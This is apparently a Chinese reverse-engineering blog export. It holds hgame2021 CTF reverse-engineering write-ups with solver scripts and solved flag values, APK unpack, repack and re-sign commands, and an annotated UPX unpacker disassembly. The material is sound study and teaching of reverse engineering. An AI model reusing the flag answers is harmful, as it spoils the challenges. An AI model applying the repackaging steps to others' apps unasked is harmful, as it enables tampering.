0x00000042, 0x0000004C, 0x0000007A, 0x00000006,     0x0000002D, 0x0000002C, 0x0000002E, 0x0000005F, 0x00000059, 0x0000005A, 0x00000076, 0x00000077,     0x00000075, 0x0000007B, 0x0000004E, 0x00000040, 0x00000073, 0x00000000, 0x00000021, 0x00000052,     0x00000060, 0x0000006E, 0x00000056, 0x0000002A, 0x00000036, 0x00000047, 0x0000004B, 0x00000078    };    for (int i = 374; i &gt;= 0; i--)        miwen[i] = miwen[i] ^ miwen[i + 1] ^ i;    miwen[375] = 120;    strcpy(v9, "ABCDEFGH");    strcpy(&amp;v9[9], "12345678");    strcpy(&amp;v9[18], "0IJKLMNO");    strcpy(&amp;v9[27], "+OPQRStu");    strcpy(&amp;v9[36], "\\vwxyzTU");    strcpy(&amp;v9[45], "abcdefgh");    strcpy(&amp;v9[54], "VWXYZijk");    strcpy(&amp;v9[63], "lmnopqrs");    for (i = 0; i &lt; 375; i+=2)    {        for (int j = 0; j &lt;= 255; j++)        {            v28 = (j &gt;&gt; 6) &amp; 1;            v27 = (j &gt;&gt; 3) &amp; 7;            v26 = j &amp; 7;            v10[i] = v9[9 * v28 + v27];            v10[i + 1] = v9[9 * v27 + v26];            if (v10[i] == (unsigned char)miwen[i] &amp;&amp; v10[i + 1] == (unsigned char)miwen[i + 1])            {                v.push_back(j);                break;            }        }    }    vector&lt;char&gt;::iterator k = v.begin();    i = 0;    while(k != v.end())    {        if (*k == '#')        {            std::stringstream ss;            ss &lt;&lt; a[i];            ss &gt;&gt; hex &gt;&gt; b[i];            i++;        }        else            a[i].push_back(*k);        k++;    }    for (int j = i - 1; j &gt;= 2; j--)    {        b[j] = b[j] - b[j - 1] - b[j - 2];    }    for (int j = 0; j &lt; i; j++)        printf("%c", b[j]);    system("pause");}   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>apk-reverse-basics</title>
      <link href="/2021/07/20/apk-reverse-basics/"/>
      <url>/2021/07/20/apk-reverse-basics/</url>
      
        <content type="html"><![CDATA[<h1 id="apk解包打包"><a href="#apk解包打包" class="headerlink" title="apk解包打包"></a>apk解包打包</h1><p>为了改xml文件的debuggable = ‘true’, 直接解压会有乱码</p><span id="more"></span><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://blog.csdn.net/Mrzhouxu/article/details/79225439">https://blog.csdn.net/Mrzhouxu/article/details/79225439</a></p><p><a href="https://blog.csdn.net/liuyanggofurther/article/details/46712601">https://blog.csdn.net/liuyanggofurther/article/details/46712601</a></p><p><a href="https://blog.csdn.net/weixin_39593718/article/details/110803709">https://blog.csdn.net/weixin_39593718/article/details/110803709</a></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>jdk , apktool </p><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>apktool d xxx.apk -f</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>apktool b xxx -o xxx-new.apk</p><h2 id="zipalign"><a href="#zipalign" class="headerlink" title="zipalign"></a>zipalign</h2><p>在签名jarsigner之后使用</p><p>在签名apksigner之前使用</p><pre class="line-numbers language-none"><code class="language-none">zipalign -v -p 4 input.apk output.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h2><pre class="line-numbers language-none"><code class="language-none">keytool -genkey -v -keystore release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><p>注意,android11不能安装v1的签名方式</p><p><img src="/2021/07/20/apk-reverse-basics/error.png"></p><pre class="line-numbers language-none"><code class="language-none">java -jar apksigner.jar sign --ks keystore的路径 --out output.apk input.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="检验签名"><a href="#检验签名" class="headerlink" title="检验签名"></a>检验签名</h2><pre class="line-numbers language-none"><code class="language-none">java -jar D:\sdk\build-tools\30.0.3\lib\apksigner.jar verify -v xxx.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame2021 reverse part wp</title>
      <link href="/2021/07/18/hgame2021-reverse-part-wp/"/>
      <url>/2021/07/18/hgame2021-reverse-part-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Hgame2021"><a href="#Hgame2021" class="headerlink" title="Hgame2021"></a>Hgame2021</h1><span id="more"></span><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>这个题目主要是加密过程比较复杂，加密为7次，每次都要先得求最后一个字符，然后依加密顺序的逆顺序根据左右字符来解密当前字符。<br><img src="https://img.kancloud.cn/06/52/06526eba86bbee8af341fe0078127588_1351x597.png" alt="img"><br>这里加密是有溢出的，</p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p><a href="https://1.oss.hgame2021.vidar.club/pypy_65e4560b560f834dae3b59a409fe0f83.txt">https://1.oss.hgame2021.vidar.club/pypy_65e4560b560f834dae3b59a409fe0f83.txt</a> 这个题目主要是考察py入门，看得懂python字节码就能做。字节码直接查python文档。<br><img src="https://img.kancloud.cn/f8/da/f8da374ff8fa9923653ed21f1d9c042e_450x248.png" alt="img"><br>这个是写的还原源码脚本，bytes那个返回的是bytes对象，可能会报错，但是不影响分析</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>题目要求输入两个字符串得到flag,其实这两个字符串+一起就是flag，所以不能直接动调出来，而且因为这个题目用到多线程，所以用ida我连判断第二个字符串的地方都没动调进去（听说用OD可以）</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><img src="https://img.kancloud.cn/d0/d4/d0d4ef039ce3bb4504edf35206e2ec31_1272x267.png" alt="img"><br><img src="https://img.kancloud.cn/96/47/96477fd79f08bfa8fd0643ef1085d9ad_636x206.png" alt="img"></p><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><img src="https://img.kancloud.cn/a6/46/a6462e07e92ffe2c61b0b7f5adb3b419_912x178.png" alt="img"><br><img src="https://img.kancloud.cn/c3/f8/c3f8b2e9022ce37c6fbb97e4c8d481dc_984x507.png" alt="img"><br><img src="https://img.kancloud.cn/64/ec/64ec5f42ffaf07d1533f44d3cddf6392_938x74.png" alt="img"><br>BCrptEncrypt具体可以查看官方文档<br>密钥生成函数<br><img src="https://img.kancloud.cn/d2/57/d257bb3a611eb52012790537245e600e_947x36.png" alt="img"><br><img src="https://img.kancloud.cn/81/26/8126de3fb1ea2a13fbcc6bdd8bce83c3_694x188.png" alt="img"><br>pbsecret由共享内存得到,Name为加密算法<br><img src="https://img.kancloud.cn/1c/b0/1cb0bacc135a42bb50c32d936b0865af_333x163.png" alt="img"><br>此为AES加密<br>共享内存建立函数<br><img src="https://img.kancloud.cn/10/3a/103af329906a71449bfb7cc46cf6adc9_831x761.png" alt="img"><br>这个BE43A0由前面得到，是第一次输入字符串，与0-15进行异或后传递到共享内存作为密钥<br>加密iv是v12，(因为有iv所以是CBC加密方式）<br><img src="https://img.kancloud.cn/a4/28/a428c2b5460dbc52bd1ae18119f7e3ff_573x110.png" alt="img"><br>BE312C就是IV，点进去看是0-15，长度不管，是16就行</p><p>第二次输入的字符串就是将输入的字符串用AES加密（因为由IV，应该为CBC模式，一次输入字符串与0-15异或后得到密钥，0-15作为IV，网上有输入为16进制模式的AES解密<br>BE30E0为加密后正确的密文<br>输入完后得到flag有一个坑，就是输入的两个字符中间有一个非法字符（不在ASCII范围内，那个要删去）</p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>第三周到目前为止一复现出来一道题，（当时做的时候都出了，结果我没注意脚本输出顺序，flag里面有些字符反了）<br>其他题目还存在一些问题，正在解决。</p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p><img src="https://img.kancloud.cn/a2/de/a2dea62fa7877a9b9e9c5a9b5eb1d1ae_690x95.png" alt="img"><br>char型存放在unsigned int里面，观察栈可以看出来v7对v6赋值，进入401216函数分析<br><img src="https://img.kancloud.cn/13/65/136508a16b642b53fd4da9df4e639a9c_579x54.png" alt="img"><br><img src="https://img.kancloud.cn/d4/66/d466cddc8273f6a3c9e2f905df92543f_665x58.png" alt="img"><br>发现这个是解36元方程组，先改v1,v39类型，分别改为int **,和int *,再写脚本进行清洗，这里可以用大计里面教的制表格来清洗，清洗完毕后用python来解，sympy库可以直接解方程，比较长我就放出来了。解出来发现是个假的flag，里面包含fake flag smc的提示。<br>因为函数不多，我直接挨着翻了，发现函数40699B<br><img src="https://img.kancloud.cn/89/39/89391ca4992f6af4edf8c9a6f3391087_688x139.png" alt="img"><br>这里就是SMC自解密<br>IDC脚本</p><pre class="line-numbers language-none"><code class="language-none">auto x = 0x401216;auto y = 0x409080;auto i,z1,z2;for (i=0; i&lt;=1086; i++){    z1 = Byte(x);    z2 = Byte(y);    z1 = z1 ^ z2;    PatchByte(x, z1);    x = x + 1;    y = y + 1;}Message("\n success\n");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解出来之后感觉又是一个解方程，但是比刚刚那个简单多了。<br><img src="https://img.kancloud.cn/6e/b0/6eb0bdeed4575510b696305b72763005_884x361.png" alt="img"><br>这是一个矩阵乘法，管他是什么，当成解方程做又没错，和刚刚一样写脚本解就行了。<br>a_0: 104, a_1: 103, a_2: 97, a_3: 109, a_4: 101, a_5: 123, a_10: 95, a_11: 83, a_6: 69, a_7: 64, a_8: 115, a_9: 121, a_12: 101, a_13: 49, a_14: 102, a_15: 45, a_16: 77, a_17: 111, a_18: 100, a_19: 105, a_20: 102, a_21: 121, a_22: 105, a_23: 110, a_24: 103, a_25: 95, a_26: 67, a_27: 48, a_28: 111, a_29: 111, a_30: 100, a_31: 101, a_32: 101, a_33: 51, a_34: 51, a_35: 125</p><p>这里注意是a10在a5后面，我就是这里瞎了没看到（真正的星际玩家）</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>这个vm我调试了好久好久才摸清逻辑。</p><p>根据字符串查找找到关键函数<br>我是一步步的动调得到的大致逻辑，我并不知道有什么好方法来直接得出逻辑（大概只能猜测稍微快点？）<br><img src="https://img.kancloud.cn/d0/a4/d0a4e3601bf358dd080c281b0cfd302b_618x461.png" alt="img"><br>可以看到case里面的值与opcode的值做比较，如果满足条件，调用另外一个opcode2存放传过来的参数（地址）上面的值 v11为当前位置值，v5为下一位置。vm一般都会有指令集，每个指令控制不同的运行逻辑，根据后面的操作不难看出这个指令就是传过来的参数（地址）上面的值。</p><p>接下来就到了一步步调试的时间。<br>我讲其中几个标志位按照顺序改名为b1b2b3b4b5of(这个of只有后面比较用一次，那个类似于cmp，改变of）<br>大概判断出，b5 指令集下标 b4 栈下标 b3 输入流下标<br>首先进行的是测量字符串长度。<br>将输入字符串按照顺序取字符放到b1中，如果b2（初始值为0）等于b1，字符串结束，此时b3就是长度<br>然后把b3压入栈又赋值到b1中，将b1和b2比较（有指令将b2变为0x22），如果相等则跳转<br>后面就是两次加密，第一次是b2设置初始值为FE，与输入字符串异或，每次异或b2+0x23,下标–。第二次是输入字符串减去b2,每次b2则减少60，b2是unsigned char型。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;iosteam&gt;using namespace std;int main(){    unsigned char a\[\] = {207, 191, 128, 59, 246, 175, 126, 2, 36, 237,    112, 58, 244, 235, 122, 74, 231, 247, 162, 103,    23, 240, 198, 118, 54, 232, 173, 130, 46, 219,    183, 79, 230, 9};    unsigned char key = 0x1a;    for (int i = 0; i &lt; 34; i++){    a[i] += key;    key += 0x60;}    key = 0x81;    for (int i = 0; i &lt; 34; i++){    a[i] ^= key;    key -= 0x23;}    for (int i = 0; i &lt; 34; i++){    cout &lt;&lt; (char)a[i];}    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="r-exe-忘记名字了）"><a href="#r-exe-忘记名字了）" class="headerlink" title="r.exe(忘记名字了）"></a>r.exe(忘记名字了）</h3><p>这个题目逻辑很容易，不能用查找字符串，因为这个字符串是动态解密加载进去的。直接硬调，还是不难的，根据输出判断关键函数。<br><img src="https://img.kancloud.cn/e2/ae/e2ae25b7cc60972a2dfcd7816ada0512_509x73.png" alt="img"><br>这个函数对输入进行加密，点进去看，发现非常复杂，这个时候就需要好好考虑这个是加密算法的识别，挨着翻，可以看到sub_7FF63A903010中有一个256位的数组的使用，然后，有点想sbox了，检查一下前面几个值，这个就是aes加密（sbox固定）了，前面的密钥生成包含iv，就是aes的cbc模式，直接解密就能得到了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UPX解壳的一部分分析</title>
      <link href="/2021/07/18/upx%20loader/"/>
      <url>/2021/07/18/upx%20loader/</url>
      
        <content type="html"><![CDATA[<h1 id="UPX-loader分析"><a href="#UPX-loader分析" class="headerlink" title="UPX loader分析"></a>UPX loader分析</h1><span id="more"></span><h2 id="0x00-引用"><a href="#0x00-引用" class="headerlink" title="0x00 引用"></a>0x00 引用</h2><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=19345&amp;highlight=UPX">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=19345&amp;highlight=UPX</a></p><p><a href="https://bbs.pediy.com/thread-258222.htm#msg_header_h2_4">https://bbs.pediy.com/thread-258222.htm#msg_header_h2_4</a></p><p><a href="https://www.chinapyg.com/thread-76768-1-1.html">https://www.chinapyg.com/thread-76768-1-1.html</a></p><p><a href="https://www.52pojie.cn/thread-294773-1-1.html">https://www.52pojie.cn/thread-294773-1-1.html</a></p><h2 id="0x01-用ida进行调试"><a href="#0x01-用ida进行调试" class="headerlink" title="0x01 用ida进行调试"></a>0x01 用ida进行调试</h2><p>先用ida打开，可以看到两个分区upx0,upx1,直接静态调试太难了，上动态调试,（UPX1:00EBB870下断点)</p><h2 id="0x02-地址入栈"><a href="#0x02-地址入栈" class="headerlink" title="0x02 地址入栈"></a>0x02 地址入栈</h2><pre class="line-numbers language-none"><code class="language-none">UPX1:00EBB871 mov   esi, offset dword_EB9000  对esi edi初始化，分别装入upx1UPX1:00EBB876 lea   edi, [esi-8000h]           ，upx0地址UPX1:00EBB87C push  ediUPX1:00EBB87D or   ebp, 0FFFFFFFFhUPX1:00EBB880 jmp   short loc_EBB892UPX1:00EBB880 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-解码"><a href="#0x03-解码" class="headerlink" title="0x03 解码"></a>0x03 解码</h2><pre class="line-numbers language-汇编语言" data-language="汇编语言"><code class="language-汇编语言">UPX1:00EBB882 align 8UPX1:00EBB888UPX1:00EBB888 loc_EBB888:             UPX1:00EBB888 mov   al, [esi]               复制upx1到upx0UPX1:00EBB88A inc   esiUPX1:00EBB88B mov   [edi], alUPX1:00EBB88D inc   ediUPX1:00EBB88EUPX1:00EBB88E loc_EBB88E:             UPX1:00EBB88E                   UPX1:00EBB88E add   ebx, ebx               UPX1:00EBB890 jnz   short loc_EBB899       若ebx为0不跳转，循环结束 UPX1:00EBB892                              （ebx已经失效，需要重新读入）UPX1:00EBB892 loc_EBB892:             UPX1:00EBB892 mov   ebx, [esi]             读取esi地址对应内容放入ebx.UPX1:00EBB894 sub   esi, 0FFFFFFFCh        ebx控制upx1复制到upx0循环UPX1:00EBB897 adc   ebx, ebx               的进行同时esi地址加4，已经 UPX1:00EBB899                              读入的ebx不能作为内容复制到UPX1:00EBB899 loc_EBB899:                  upx0UPX1:00EBB899 jb   short loc_EBB888        联系00EBB88E的add命令来判断UPX1:00EBB89B mov   eax, 1                 upx1复制到upx0是否继续进行UPX1:00EBB8A0UPX1:00EBB8A0 loc_EBB8A0:              UPX1:00EBB8A0                   UPX1:00EBB8A0 add   ebx, ebxUPX1:00EBB8A2 jnz   short loc_EBB8AB       同00EBB890若ebx=0失效需要UPX1:00EBB8A4 mov   ebx, [esi]             重新读入UPX1:00EBB8A6 sub   esi, 0FFFFFFFChUPX1:00EBB8A9 adc   ebx, ebxUPX1:00EBB8ABUPX1:00EBB8AB loc_EBB8AB:             UPX1:00EBB8AB adc   eax, eaxUPX1:00EBB8AD add   ebx, ebxUPX1:00EBB8AF jnb   short loc_EBB8A0UPX1:00EBB8B1 jnz   short loc_EBB8BCUPX1:00EBB8B3 mov   ebx, [esi]              还是在判断ebx是否需要重新读入UPX1:00EBB8B5 sub   esi, 0FFFFFFFChUPX1:00EBB8B8 adc   ebx, ebxUPX1:00EBB8BA jnb   short loc_EBB8A0UPX1:00EBB8BCUPX1:00EBB8BC loc_EBB8BC:             UPX1:00EBB8BC xor   ecx, ecxUPX1:00EBB8BE sub   eax, 3UPX1:00EBB8C1 jb   short loc_EBB8D0UPX1:00EBB8C3 shl   eax, 8UPX1:00EBB8C6 mov   al, [esi]             读入esi地址对应内容来  UPX1:00EBB8C8 inc   esi                   判断解密是否完成UPX1:00EBB8C9 xor   eax, 0FFFFFFFFhUPX1:00EBB8CC jz   short loc_EBB942       UPX1:00EBB8CE mov   ebp, eax              得到ebp对后面upx自复制UPX1:00EBB8D0                             产生影响（偏移量）UPX1:00EBB8D0 loc_EBB8D0:             UPX1:00EBB8D0 add   ebx, ebxUPX1:00EBB8D2 jnz   short loc_EBB8DBUPX1:00EBB8D4 mov   ebx, [esi]           读取upx1的数据到ebxUPX1:00EBB8D6 sub   esi, 0FFFFFFFCh      UPX1:00EBB8D9 adc   ebx, ebxUPX1:00EBB8DBUPX1:00EBB8DB loc_EBB8DB:             UPX1:00EBB8DB adc   ecx, ecxUPX1:00EBB8DD add   ebx, ebxUPX1:00EBB8DF jnz   short loc_EBB8E8      UPX1:00EBB8E1 mov   ebx, [esi]UPX1:00EBB8E3 sub   esi, 0FFFFFFFChUPX1:00EBB8E6 adc   ebx, ebxUPX1:00EBB8E8UPX1:00EBB8E8 loc_EBB8E8:              UPX1:00EBB8E8 adc   ecx, ecxUPX1:00EBB8EA jnz   short loc_EBB90CUPX1:00EBB8EC inc   ecxUPX1:00EBB8EDUPX1:00EBB8ED loc_EBB8ED:              UPX1:00EBB8ED                    UPX1:00EBB8ED add   ebx, ebx                 ebx控制ecx值，UPX1:00EBB8EF jnz   short loc_EBB8F8       UPX1:00EBB8F1 mov   ebx, [esi]UPX1:00EBB8F3 sub   esi, 0FFFFFFFChUPX1:00EBB8F6 adc   ebx, ebxUPX1:00EBB8F8UPX1:00EBB8F8 loc_EBB8F8:                  UPX1:00EBB8F8 adc   ecx, ecx                ecx翻倍加CFUPX1:00EBB8FA add   ebx, ebx                ebx判断循环是否继续UPX1:00EBB8FC jnb   short loc_EBB8EDUPX1:00EBB8FE jnz   short loc_EBB909UPX1:00EBB900 mov   ebx, [esi]UPX1:00EBB902 sub   esi, 0FFFFFFFChUPX1:00EBB905 adc   ebx, ebxUPX1:00EBB907 jnb   short loc_EBB8EDUPX1:00EBB909UPX1:00EBB909 loc_EBB909:             UPX1:00EBB909 add   ecx, 2UPX1:00EBB90CUPX1:00EBB90C loc_EBB90C:             UPX1:00EBB90C cmp   ebp, 0FFFFF300hUPX1:00EBB912 adc   ecx, 1UPX1:00EBB915 lea   edx, [edi+ebp]         ebp为向前偏移量，upx0复制UPX1:00EBB918 cmp   ebp, 0FFFFFFFCh        内容的开始地址UPX1:00EBB91B jbe   short loc_EBB92C       判断两种不同的upx0自复制方式UPX1:00EBB91D                              ebp小于-4则用第二种            UPX1:00EBB91D loc_EBB91D:             UPX1:00EBB91D mov   al, [edx]              第一种upx0内容复制过程UPX1:00EBB91F inc   edx             UPX1:00EBB920 mov   [edi], alUPX1:00EBB922 inc   ediUPX1:00EBB923 dec   ecx                    ecx表示复制的次数，减少UPX1:00EBB924 jnz   short loc_EBB91D       为0则跳出循环UPX1:00EBB926 jmp   loc_EBB88E             向前跳转到upx1复制到upx0UPX1:00EBB926 ;                            语句的位置（先进行ebx判断）UPX1:00EBB92B align 4UPX1:00EBB92CUPX1:00EBB92C loc_EBB92C:             UPX1:00EBB92C                    UPX1:00EBB92C mov   eax, [edx]          第二种upx0内容复制过程 UPX1:00EBB92E add   edx, 4              ecx判断是否跳出循环每次UPX1:00EBB931 mov   [edi], eax          减4减溢出了则跳出循环UPX1:00EBB933 add   edi, 4UPX1:00EBB936 sub   ecx, 4UPX1:00EBB939 ja   short loc_EBB92C      UPX1:00EBB93B add   edi, ecx            复制多了，地址前移，后面                                                复制覆盖前面复制多的 UPX1:00EBB93D jmp   loc_EBB88E          跳回去进行upx1复制到upx0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里带有0FFFFFFFCh的语句附近基本上都是读取upx1的内容到ebx，然后esi中的地址加4（读到ebx的内容不能作为upx0的内容要跳过它）0FFFFFFFFCh那一条是为了使地址加4</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>upx的解码方式分为两种一种是将upx1的数据复制到upx0，第二种是将upx0自复制，这种自复制有两种，区别是一次循环复制的多少，第二种的明显效率更高，但是第一种可以单字节复制更适用，通过ebp来判断偏移，可以将upx0任意内容进行复制，ebx则是用来控制upx1复制到upx0的关键，是从upx1读入再进行运算，ecx是控制自复制的关键，是loader代码运算得到（ebx运算时CF改变和控制ecx运算循环会影响ecx），最后ebx xor (异或)ffffffff判断是否跳出循环。</p><p>可以看出，ebx是最关键的循环判断变量，而这个变量来源于upx1中，这应该是在加壳的时候就已经设置好位置和大小的</p><p>采用将重复的数据以循环写出的方式来减少空间储存（以一个来重复写出多个，这样就只用储存一个和重复条件，达到压缩的目的）</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
